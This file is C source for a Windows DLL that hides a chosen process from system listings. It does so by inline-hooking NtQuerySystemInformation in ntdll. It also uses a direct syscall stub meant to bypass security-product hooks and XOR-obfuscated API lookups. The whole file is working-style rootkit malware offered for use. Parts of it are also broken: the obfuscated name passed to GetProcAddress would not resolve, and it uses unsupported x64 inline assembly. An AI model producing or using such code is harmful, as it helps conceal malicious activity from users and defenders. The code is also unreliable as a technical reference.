#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NtQuerySystemInformation_t OriginalNtQuerySystemInformation;
DWORD HiddenPID = 0;
BYTE OriginalBytes[5];  // Store original function bytes

// Function to resolve API names dynamically (obfuscation)
FARPROC GetFunctionAddress(HMODULE module, const char* funcName) {
    char obfuscatedName[32];
    int len = strlen(funcName);
    for (int i = 0; i < len; i++) {
        obfuscatedName[i] = funcName[i] ^ 0xAA;  // XOR obfuscation
    }
    obfuscatedName[len] = '\0';
    return GetProcAddress(module, obfuscatedName);
}

// Syscall stub (bypasses ntdll hooks)
__declspec(naked) NTSTATUS NTAPI SyscallNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength) 
{
    __asm {
        mov r10, rcx
        mov eax, 0x36  // Syscall ID for NtQuerySystemInformation (varies per Windows version)
        syscall
        ret
    }
}

// Find PID by name (no API hooks used)
DWORD GetPIDByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Hooked function (hides process)
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength) 
{
    // Call syscall directly (bypassing hooks)
    NTSTATUS status = SyscallNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    // Process hiding logic
    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = NULL;

        while (pCurrent) {
            if (pCurrent->UniqueProcessId == (HANDLE)HiddenPID) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                } else {
                    pCurrent->NumberOfThreads = 0;  // Hide it
                }
            }
            pPrev = pCurrent;
            if (pCurrent->NextEntryOffset == 0) break;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCurrent + pCurrent->NextEntryOffset);
        }
    }

    return status;
}

// Hook function using inline patching
void HookNtQuerySystemInformation() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)GetFunctionAddress(ntdll, "NtQuerySystemInformation");

    DWORD oldProtect;
    VirtualProtect(OriginalNtQuerySystemInformation, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Save original bytes
    memcpy(OriginalBytes, OriginalNtQuerySystemInformation, 5);

    // Write JMP instruction
    *(BYTE*)OriginalNtQuerySystemInformation = 0xE9;
    *(DWORD*)((BYTE*)OriginalNtQuerySystemInformation + 1) = (DWORD)((BYTE*)&HookedNtQuerySystemInformation - (BYTE*)OriginalNtQuerySystemInformation - 5);

    VirtualProtect(OriginalNtQuerySystemInformation, 5, oldProtect, &oldProtect);
}

// Unhook and restore original function
void UnhookNtQuerySystemInformation() {
    DWORD oldProtect;
    VirtualProtect(OriginalNtQuerySystemInformation, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(OriginalNtQuerySystemInformation, OriginalBytes, 5);
    VirtualProtect(OriginalNtQuerySystemInformation, 5, oldProtect, &oldProtect);
}

// Exposed function to hide process by PID
__declspec(dllexport) void HideProcess(DWORD pid) {
    HiddenPID = pid;
    HookNtQuerySystemInformation();
}

// Exposed function to hide process by name
__declspec(dllexport) void HideProcessByName(const char* processName) {
    HiddenPID = GetPIDByName(processName);
    if (HiddenPID == 0) return;
    HookNtQuerySystemInformation();
}

// Exposed function to unhide process
__declspec(dllexport) void UnhideProcess() {
    HiddenPID = 0;
    UnhookNtQuerySystemInformation();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
